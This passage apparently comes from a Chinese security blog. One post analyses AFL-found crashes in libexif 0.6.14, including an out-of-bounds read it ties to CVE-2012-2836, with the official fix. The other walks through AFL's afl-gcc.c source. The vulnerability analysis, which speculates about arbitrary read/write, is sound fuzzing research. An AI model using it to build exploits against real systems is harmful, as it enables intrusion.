<h2 id="3-exif-mnote-data-olympus-load"><a href="#3-exif-mnote-data-olympus-load" class="headerlink" title="3.exif_mnote_data_olympus_load"></a>3.exif_mnote_data_olympus_load</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  __memmove_evex_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:<span class="number">872</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000555555592fb0</span> in <span class="title function_">exif_mnote_data_olympus_load</span> <span class="params">(en=<span class="number">0x5555557b29c0</span>, buf=<span class="number">0x5555557b0910</span> <span class="string">&quot;Exif&quot;</span>, buf_size=<span class="number">4795</span>)</span> at exif-mnote-data-olympus.c:<span class="number">357</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x000055555557d58e</span> in <span class="title function_">exif_mnote_data_load</span> <span class="params">(d=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, buf_size=&lt;optimized out&gt;)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-mnote-data.c:<span class="number">84</span></span><br><span class="line">#<span class="number">3</span>  exif_data_load_data (data=<span class="number">0x5555557adee0</span>, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-data.c:<span class="number">867</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x0000555555571d50</span> in <span class="title function_">exif_loader_get_data</span> <span class="params">(loader=&lt;optimized out&gt;)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-loader.c:<span class="number">387</span></span><br><span class="line">#<span class="number">5</span>  main (argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe488</span>) at main.c:<span class="number">438</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007ffff7c29d90</span> in <span class="title function_">__libc_start_call_main</span> <span class="params">(main=main<span class="meta">@entry</span>=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe488</span>)</span> at ../sysdeps/nptl/libc_start_call_main.h:<span class="number">58</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x00007ffff7c29e40</span> in <span class="title function_">__libc_start_main_impl</span> <span class="params">(main=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=<span class="number">2</span>, argv=<span class="number">0x7fffffffe488</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe478</span>)</span> at ../csu/libc-start.c:<span class="number">392</span></span><br><span class="line">#<span class="number">8</span>  <span class="number">0x000055555556b365</span> in <span class="title function_">_start</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></div>
<h2 id="4-exif-get-slong"><a href="#4-exif-get-slong" class="headerlink" title="4.exif_get_slong"></a>4.exif_get_slong</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  <span class="number">0x0000555555578eac</span> in <span class="title function_">exif_get_slong</span> <span class="params">(b=&lt;optimized out&gt;, order=EXIF_BYTE_ORDER_MOTOROLA)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-utils.c:<span class="number">135</span></span><br><span class="line">#<span class="number">1</span>  exif_get_long (buf=&lt;optimized out&gt;, order=EXIF_BYTE_ORDER_MOTOROLA) at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-utils.c:<span class="number">167</span></span><br><span class="line">#<span class="number">2</span>  exif_entry_fix (e=<span class="number">0x5555557b16f0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-entry.c:<span class="number">193</span></span><br><span class="line">#<span class="number">3</span>  fix_func (e=<span class="number">0x5555557b16f0</span>, data=<span class="number">0x0</span>) at exif-content.c:<span class="number">231</span></span><br><span class="line">#<span class="number">4</span>  exif_content_foreach_entry (content=<span class="number">0x5555557ae4a0</span>, data=<span class="number">0x0</span>, func=&lt;optimized out&gt;) at exif-content.c:<span class="number">200</span></span><br><span class="line">#<span class="number">5</span>  exif_content_fix (c=<span class="number">0x5555557ae4a0</span>) at exif-content.c:<span class="number">247</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x000055555557d642</span> in <span class="title function_">exif_data_foreach_content</span> <span class="params">(data=<span class="number">0x5555557ae370</span>, user_data=<span class="number">0x0</span>, func=&lt;optimized out&gt;)</span> at exif-data.c:<span class="number">1031</span></span><br><span class="line">#<span class="number">7</span>  exif_data_fix (d=<span class="number">0x5555557ae370</span>) at exif-data.c:<span class="number">1176</span></span><br><span class="line">#<span class="number">8</span>  exif_data_load_data (data=<span class="number">0x5555557ae370</span>, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-data.c:<span class="number">871</span></span><br><span class="line">#<span class="number">9</span>  <span class="number">0x0000555555571d50</span> in <span class="title function_">exif_loader_get_data</span> <span class="params">(loader=&lt;optimized out&gt;)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-loader.c:<span class="number">387</span></span><br><span class="line">#<span class="number">10</span> main (argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe488</span>) at main.c:<span class="number">438</span></span><br><span class="line">#<span class="number">11</span> <span class="number">0x00007ffff7c29d90</span> in <span class="title function_">__libc_start_call_main</span> <span class="params">(main=main<span class="meta">@entry</span>=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe488</span>)</span> at ../sysdeps/nptl/libc_start_call_main.h:<span class="number">58</span></span><br><span class="line">#<span class="number">12</span> <span class="number">0x00007ffff7c29e40</span> in <span class="title function_">__libc_start_main_impl</span> <span class="params">(main=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=<span class="number">2</span>, argv=<span class="number">0x7fffffffe488</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe478</span>)</span> at ../csu/libc-start.c:<span class="number">392</span></span><br><span class="line">#<span class="number">13</span> <span class="number">0x000055555556b365</span> in <span class="title function_">_start</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></div>
<h1 id="五-Crashes样本分析"><a href="#五-Crashes样本分析" class="headerlink" title="五.Crashes样本分析"></a>五.Crashes样本分析</h1><p>根据报错信息，我们一共分出了上面的四类错误，那我们就来逐一分析一下这四个位置：</p>
<h2 id="1-exif-get-sshort-1"><a href="#1-exif-get-sshort-1" class="headerlink" title="1.exif_get_sshort"></a>1.exif_get_sshort</h2><p>对于第一类报错，很明显地提示<code>&lt;error: Cannot access memory at address 0x5556557adf05&gt;</code>，那我们再次使用GDB加载样本，看一下内存布局：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/libexif-vmmap.png"
                      alt="libexif-vmmap"
                ><br>可以看到，这里是发生了堆溢出，那我们跟踪到源码中看一下具体原因。<br>根据程序crash时的栈回溯可以看到，第一次出现错误是在<code>exif_get_sshort</code>函数中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">exif_get_sshort (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, ExifByteOrder order)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的buf作为参数出错，那么buf地址错误的原因就在<code>exif-data.c:819</code>，我们到源码中看一看：<code>n = exif_get_short (d + 6 + offset, data-&gt;priv-&gt;order);</code><br>这里可以看出来是<code>d+6+offset</code>这个计算中有一个出错了，那我们就来看看d和offset的来源：<br><code>memcmp (d, ExifHeader, 6)</code>这里d是预定义赋值，应该不会出现什么问题。<br><code>offset = exif_get_long (d + 10, data-&gt;priv-&gt;order);</code>这里的offset很明显是从某个结构体中拿出来的，猜测这里应该是取自文件某个结构体里面。<br>那么为什么这个offset就导致出现了问题呢？<br>注意到在赋值之后有这么一行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>这句话貌似是检查了offset，对其值做出了限制，但是真的是这样吗？如果我们构造offset，使其永远小于ds呢？那么后续会不会buf的值发生越界，从而去读&#x2F;写不该写的地方呢？<br>事实证明这就是<code>CVE-2012-2836</code>，这样，我们第一个漏洞便分析出来了。</p>
<h3 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h3><p>这里我就不下载官方补丁了，直接去看一看是如何修复的，个人认为应该还是对offset做出限制。<br>官方修复：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Sanity check the offset, being careful about overflow */</span></span><br><span class="line">	<span class="keyword">if</span> (offset &gt; ds || offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">/* Parse the actual exif data (usually offset 14 from start) */</span></span><br><span class="line">	exif_data_load_data_content (data, EXIF_IFD_0, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* IFD 1 offset */</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="2-exif-data-load-data-content-1"><a href="#2-exif-data-load-data-content-1" class="headerlink" title="2.exif_data_load_data_content"></a>2.exif_data_load_data_content</h2><p>还是一样，先看一下栈回溯中有什么提示。<br>?没提示哪里出错了？那先跳过看一下其他的错误[偷笑]。</p>
<h2 id="3-exif-mnote-data-olympus-load-1"><a href="#3-exif-mnote-data-olympus-load-1" class="headerlink" title="3.exif_mnote_data_olympus_load"></a>3.exif_mnote_data_olympus_load</h2><p>同样的，先跳过，先看有提示的，能够提升效率。</p>
<h2 id="4-exif-get-slong-1"><a href="#4-exif-get-slong-1" class="headerlink" title="4.exif_get_slong"></a>4.exif_get_slong</h2><p>这里在gdb中看栈回溯的时候，发现说有变量被优化了，而且出现的是段错误，那我们就用这个样本来作为模板进行编译，再次fuzz：<br><code>afl-fuzz -i /home/shad0hun/桌面/Fuzzing101/02-libexif/out/default/crashes/exif_get_slong/ -o /home/shad0hun/桌面/Fuzzing101/02-libexif/out1 -s 123 -- /home/shad0hun/桌面/Fuzzing101/02-libexif/exif-fuzzing/bin/exif @@</code><br>对crashes样本进行分析之后，竟然没有发现报同样错误的样本，那我们就还是拿前面那个分析吧，看一下gdb给的错误信息：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">tarting program: /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/exif-fuzzing/bin/exif /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/out/<span class="keyword">default</span>/crashes/exif_get_slong/id:<span class="number">000021</span>,sig:<span class="number">11</span>,src:<span class="number">000540</span>,time:<span class="number">561396</span>,execs:<span class="number">619860</span>,op:havoc,rep:<span class="number">4</span></span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="number">0x0000555555578eac</span> in <span class="title function_">exif_get_slong</span> <span class="params">(b=&lt;optimized out&gt;, order=EXIF_BYTE_ORDER_MOTOROLA)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-utils.c:<span class="number">135</span></span><br><span class="line"><span class="number">135</span>	                <span class="keyword">return</span> ((b[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">3</span>]);</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br></pre></td></tr></table></figure></div>
<p>看到了段错误，那猜测这里应该是溢出，那我们跟踪到源码中看一下（根据栈回溯）：<br>先来看一看exif_get_slong函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">exif_get_slong (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *b, ExifByteOrder order)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line">                <span class="keyword">return</span> ((b[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">                <span class="keyword">return</span> ((b[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里<code>b</code>是作为参数，继续往上跟<code>exif_get_long</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">exif_get_long (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, ExifByteOrder order)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> (exif_get_slong (buf, order) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>exif_get_slong</code>函数的参数<code>b</code>就是来自于这里的buf，看来问题还是出现在buf身上（猜测是不是因为前面分析过的问题），但是我们还是根据栈回溯继续网上跟：<br>到了<code>exif_entry_fix</code>函数，我们先来看看出问题的地方：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">(ExifShort) exif_get_long (</span><br><span class="line">                    e-&gt;data + i *</span><br><span class="line">                    exif_format_get_size (</span><br><span class="line">                    EXIF_FORMAT_LONG), o)</span><br></pre></td></tr></table></figure></div>
<p>可以看到<code>buf</code>就是这里的<code>e-&gt;data + i *exif_format_get_size (EXIF_FORMAT_LONG)</code>，这里EXIF_FORMAT_LONG是宏，大概率不会出现问题，那么问题就应该出现在了<code>e-&gt;data</code>或者<code>i</code>越界了，我们跟踪这两个变量上去看看：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (e-&gt;format) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_FORMAT_LONG:</span><br><span class="line">            <span class="keyword">if</span> (!e-&gt;parent || !e-&gt;parent-&gt;parent) <span class="keyword">break</span>;</span><br><span class="line">            o = exif_data_get_byte_order (e-&gt;parent-&gt;parent);</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; e-&gt;components; i++)</span><br><span class="line">                exif_set_short (</span><br><span class="line">                    e-&gt;data + i *</span><br><span class="line">                    exif_format_get_size (</span><br><span class="line">                    EXIF_FORMAT_SHORT), o,</span><br><span class="line">                    (ExifShort) exif_get_long (</span><br><span class="line">                    e-&gt;data + i *</span><br><span class="line">                    exif_format_get_size (</span><br><span class="line">                    EXIF_FORMAT_LONG), o));</span><br><span class="line">            e-&gt;format = EXIF_FORMAT_SHORT;</span><br><span class="line">            e-&gt;size = e-&gt;components *</span><br><span class="line">                exif_format_get_size (e-&gt;format);</span><br><span class="line">            e-&gt;data = exif_entry_realloc (e, e-&gt;data, e-&gt;size);</span><br><span class="line">            exif_entry_log (e, EXIF_LOG_CODE_DEBUG,</span><br><span class="line">                _(<span class="string">&quot;Tag &#x27;%s&#x27; was of format &#x27;%s&#x27; (which is &quot;</span></span><br><span class="line">                <span class="string">&quot;against specification) and has been &quot;</span></span><br><span class="line">                <span class="string">&quot;changed to format &#x27;%s&#x27;.&quot;</span>),</span><br><span class="line">                exif_tag_get_name (e-&gt;tag),</span><br><span class="line">                exif_format_get_name (EXIF_FORMAT_LONG),</span><br><span class="line">                exif_format_get_name (EXIF_FORMAT_SHORT));</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
<p>这里可以看到，如果我控制<code>e-&gt;data</code>指针，那么我就能够读&#x2F;写任意地址上的内容，如果我能控制<code>e-&gt;components</code>，那么对于<code>e-&gt;data</code>后面的内容，我都能够任意读取，总而言之，如果我能够控制<code>e</code>这个结构体，那么我就能利用该漏洞，那么这个e是哪来的？<br>追溯其根源，其来自函数<code>exif_loader_get_data</code>，根据名称猜测，他也是从文件中获取到的结构体，那么初步判定是存在漏洞的。</p>
<h3 id="修复：-1"><a href="#修复：-1" class="headerlink" title="修复："></a>修复：</h3><p>猜测应该是在读取结构体的时候，针对<code>e</code>结构体中的成员<code>e-&gt;data</code>或者<code>e-&gt;components</code>做检查。</p>
]]></content>
      <categories>
        <category>Fuzzing101</category>
      </categories>
      <tags>
        <tag>Fuzzing101</tag>
        <tag>二进制漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL源码分析【1】：afl-gcc</title>
    <url>/2025/02/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%901%E3%80%91%EF%BC%9Aafl-gcc/</url>
    <content><![CDATA[<p>AFL主要的代码在afl_fuzz当中，有几个独立功能代码是分开的，其中<code>llvm_mode</code>和<code>qumu_mode</code>代码差不多，是两种模式的插桩代码，我们主要要分析的代码在<code>afl_fuzz.c</code>中。<br>在分析源代码之前，我们需要大致理解一下AFL源码的结构：</p>
<ul>
<li>插桩代码：<br>  <code>afl-as.h</code>,<code>afl-as.c</code>,<code>afl-gcc.c</code>：一般插桩模式，是针对源码进行插桩<br>  <code>llvm_mode</code>：llvm插桩模式，针对源码进行插桩，编译器使用clang<br>  <code>qemu_mode</code>：qemu插桩模式，针对二进制文件进行插桩</li>
<li>fuzz模块：<br>  <code>afl-fuzz.c</code>：实现fuzz的核心代码，AFL的主体。</li>
<li>其他辅助模块：<br>  <code>afl-analyze</code>：对测试用例进行分析，通过分析给定的用例，确定是否可以发现用例中有意义的字段。<br>  <code>afl-plot</code>：生成测试任务的状态图<br>  <code>afl-tmin</code>：对测试用例进行最小化<br>  <code>afl-cmin</code>：对语料库进行精简操作<br>  <code>afl-showmap</code>：对测试用例进行路径反馈<br>  <code>afl-whatsup</code>：对并行fuzzing进行结果统计<br>  <code>afl-gotcpu</code>：查看当前CPU状态</li>
</ul>
<h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><p><code>afl-gcc</code>是对GCC或clang的封装，常规的用法是：在构建应用程序的时候，使用<code>./configure</code>时通过<code>cc</code>将路径传递给<code>afl-gcc</code>或者<code>afl-clang</code>，或者我们在需要插装的时候，直接使用<code>afl-as</code>进行编译。<br><code>afl-gcc</code>实际上的作用就只是作为中间人，寻找<code>afl-as</code>，注意在对编译命令操作的时候，有一个很重要的<code>-B</code>选项，告知编&#x3D;汇编器应该在哪个路径下。</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="&lt;1&gt;.变量"></a>&lt;1&gt;.变量</h3><p>首先我们来看一下用到的变量：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//AFL as的路径</span></span><br><span class="line"><span class="type">static</span> u8*  as_path;                <span class="comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span></span><br><span class="line"><span class="comment">//真正传递给CC的参数</span></span><br><span class="line"><span class="type">static</span> u8** cc_params;              <span class="comment">/* Parameters passed to the real CC  */</span></span><br><span class="line"><span class="comment">//参数数量，包括argv0</span></span><br><span class="line"><span class="type">static</span> u32  cc_par_cnt = <span class="number">1</span>;         <span class="comment">/* Param count, including argv0      */</span></span><br><span class="line"><span class="comment">//静默模式/是否使用afl-clang*</span></span><br><span class="line"><span class="type">static</span> u8   be_quiet,               <span class="comment">/* Quiet mode                        */</span></span><br><span class="line">            clang_mode;             <span class="comment">/* Invoked as afl-clang*?            */</span></span><br></pre></td></tr></table></figure></div>
<h3 id="主函数逻辑分析"><a href="#主函数逻辑分析" class="headerlink" title="&lt;2&gt;.主函数逻辑分析"></a>&lt;2&gt;.主函数逻辑分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line">         </span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line">    <span class="comment">/*这是afl-fuzz的辅助应用程序，它可以作为gcc或clang的替代品，让您可以使用所需的运行时</span></span><br><span class="line"><span class="comment">      工具重新编译第三方代码。常见的使用模式时以下之一/</span></span><br><span class="line"><span class="comment">      你可以通过AFL_CC,AFL_CXX和AFL_AS指定自定义下一阶段工具链。</span></span><br><span class="line"><span class="comment">      设置AFL_HARDEN可以在编译的代码中启用强化优化*/</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//寻找afl-gcc的位置</span></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; cc_par_cnt;i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,cc_params[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//这里为了能够更详细地看到传递的命令</span></span><br><span class="line">  </span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到在main函数中首先获取环境变量<code>AFL-QUIET</code>的值，然后输出了一段程序信息，随后进行了三次函数调用，分别为<code>find_as</code>,<code>edit_params</code>和<code>execvp</code>，我们来详细分析一下这三个函数：</p>
<h3 id="find-as函数分析"><a href="#find-as函数分析" class="headerlink" title="&lt;3&gt;.find_as函数分析"></a>&lt;3&gt;.find_as函数分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">find_as</span><span class="params">(u8* argv0)</span> &#123;</span><br><span class="line">  u8 *afl_path = getenv(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123; <span class="comment">//测试AFL_PATH路径是否可执行</span></span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      ck_free(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ck_free(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);<span class="comment">//检索命令行参数中有没有&#x27;/&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line">    u8 *dir;</span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = ck_strdup(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;<span class="comment">//检测argv[0]/afl-as是否可执行</span></span><br><span class="line">      as_path = dir;</span><br><span class="line">      ck_free(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ck_free(tmp);</span><br><span class="line">    ck_free(dir);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!access(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    <span class="comment">//如果上述两种都没有，则检测AFL_PATH/as是否可执行</span></span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  FATAL(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在<code>find_as</code>函数中，分别按序从<code>AFL_PATH</code>、<code>argv[0]</code>和<code>AFL_PATH/as</code>中寻找了as，并将找到的位置赋值给变量<code>as_path</code>。</p>
